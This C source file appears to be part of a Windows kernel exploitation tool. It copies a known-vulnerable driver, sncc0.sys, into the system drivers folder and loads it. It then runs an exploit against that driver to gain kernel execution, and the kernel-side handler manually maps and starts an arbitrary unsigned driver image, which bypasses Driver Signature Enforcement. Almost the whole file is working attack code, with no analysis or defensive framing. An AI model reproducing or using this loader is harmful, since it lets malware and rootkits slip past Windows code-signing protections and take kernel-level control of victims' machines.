#include "stdafx.h"

// make crt functions inline
#pragma intrinsic(memcpy, memset)

/*
    Name and path for vulnerable driver that will
    be installed for DSE bypass.
*/
#define VULN_DRIVER_FILE_NAME "sncc0.sys"
#define VULN_SERVICE_NAME "sncc0"

typedef struct _KERNEL_EXPL_CONTEXT
{
    void *data, *addr;
    unsigned int size;

    NTSTATUS status;

} KERNEL_EXPL_CONTEXT,
*PKERNEL_EXPL_CONTEXT;

static func_ExAllocatePool f_ExAllocatePool = NULL;
static func_ExFreePoolWithTag f_ExFreePoolWithTag = NULL;
static func_IoCreateDriver f_IoCreateDriver = NULL;

static PVOID m_KernelBase = NULL;

#define f_ExFreePool(_p_) f_ExFreePoolWithTag((_p_), 0)
//--------------------------------------------------------------------------------------
static void kernel_expl_handler(void *context)
{
    PKERNEL_EXPL_CONTEXT expl_context = (PKERNEL_EXPL_CONTEXT)context;

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        expl_context->data, 
        ((PIMAGE_DOS_HEADER)expl_context->data)->e_lfanew
    );    

    // allocate memory for driver image
    DWORD dwImageSize = pHeaders->OptionalHeader.SizeOfImage;
    PUCHAR pImage = (PUCHAR)f_ExAllocatePool(NonPagedPool, dwImageSize);
    if (pImage)
    {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
            RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

        // copy image headers
        memset(pImage, 0, dwImageSize);
        memcpy(pImage, expl_context->data, pHeaders->OptionalHeader.SizeOfHeaders);

        // copy sections        
        for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
        {
            memcpy(
                RVATOVA(pImage, pSection->VirtualAddress),
                RVATOVA(expl_context->data, pSection->PointerToRawData),
                min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
            );

            pSection += 1;
        }        

        // process image relocations
        if (!LdrProcessRelocs(pImage, pImage))
        {
            goto end;
        }

        PVOID *KernelBase = (PVOID *)LdrGetProcAddress(pImage, "m_KernelBase");
        if (KernelBase)
        {
            // tell the kernel image base to the driver
            *KernelBase = m_KernelBase;
        }

        PVOID *DriverBase = (PVOID *)LdrGetProcAddress(pImage, "m_DriverBase");
        if (DriverBase)
        {
            // tell the actual image base to the driver
            *DriverBase = pImage;
        }

        typedef NTSTATUS (NTAPI * DRIVER_ENTRY)(
            PVOID DriverObject,
            PUNICODE_STRING RegistryPath
        );        

        // get driver entry point address
        DRIVER_ENTRY Entry = (DRIVER_ENTRY)RVATOVA(
            pImage,
            pHeaders->OptionalHeader.AddressOfEntryPoint
        );        

        // call driver entry point
        if ((expl_context->status = (NTSTATUS)f_IoCreateDriver(NULL, Entry)) == STATUS_SUCCESS)
        {
            expl_context->addr = pImage;

            // success
            return;
        }        
end:
        f_ExFreePool(pImage);
    }
}
//--------------------------------------------------------------------------------------
bool kernel_expl_load_driver(void *data, unsigned int size)
{
    bool ret = false;
    KERNEL_EXPL_CONTEXT expl_context;

    expl_context.addr = NULL;
    expl_context.data = data;
    expl_context.size = size;
    expl_context.status = STATUS_UNSUCCESSFUL;    

    if ((m_KernelBase = KernelGetModuleBase("ntoskrnl.exe")) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to get kernel base\n");
        goto end;
    }

    // get real address of nt!ExAllocatePool()
    f_ExAllocatePool = (func_ExAllocatePool)KernelGetProcAddr("ExAllocatePool");
    if (f_ExAllocatePool == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!ExAllocatePool()\n");
        goto end;
    }

    // get real address of nt!ExFreePoolWithTag()
    f_ExFreePoolWithTag = (func_ExFreePoolWithTag)KernelGetProcAddr("ExFreePoolWithTag");
    if (f_ExFreePoolWithTag == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!ExFreePoolWithTag()\n");
        goto end;
    }

    // get real address of nt!IoCreateDriver()
    f_IoCreateDriver = (func_IoCreateDriver)KernelGetProcAddr("IoCreateDriver");
    if (f_IoCreateDriver == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!IoCreateDriver()\n");
        goto end;
    }

    char szDestPath[MAX_PATH];
    GetSystemDirectory(szDestPath, sizeof(szDestPath));
    lstrcat(szDestPath, "\\drivers\\" VULN_DRIVER_FILE_NAME);

    // copy vulnerable driver to the system directory
    if (CopyFile(VULN_DRIVER_FILE_NAME, szDestPath, FALSE))
    {
        // run vulnerable driver
        BOOL bUnload = InfLoadDriver(VULN_SERVICE_NAME, szDestPath);        

        // run exploit
        expl_SNCC0_Sys_220010(kernel_expl_handler, &expl_context);

        if (bUnload)
        {
            InfUnloadDriver(VULN_SERVICE_NAME);
        }

        DeleteFile(szDestPath);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "CopyFile() ERROR %d\n", GetLastError());
    }    

    // check for successful result
    if (ret = NT_SUCCESS(expl_context.status))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Driver loaded at "IFMT"\n", expl_context.addr);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Can't load driver\n");
    }

end:

    return ret;
}
//--------------------------------------------------------------------------------------
// EoF
